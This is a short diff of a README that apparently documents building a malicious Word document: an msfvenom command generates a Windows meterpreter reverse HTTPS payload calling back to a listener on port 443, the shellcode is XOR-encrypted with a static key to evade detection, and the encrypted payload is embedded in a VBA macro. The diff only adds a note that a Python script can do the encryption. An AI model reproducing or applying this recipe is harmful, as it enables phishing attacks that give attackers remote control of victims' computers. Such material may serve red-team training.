@@ -11,7 +11,8 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.142 LPORT=443 
 ```
 
 ### 2. Encrypt the Payload
-Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with a static key (`0xFA`).
+- Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with a static key (`0xFA`).
+- The python3 script will do the same.
 
 ### 3. Embed the Encrypted Payload in VBA Macro
 - Open Microsoft Word and access the VBA Editor (`ALT + F11`)
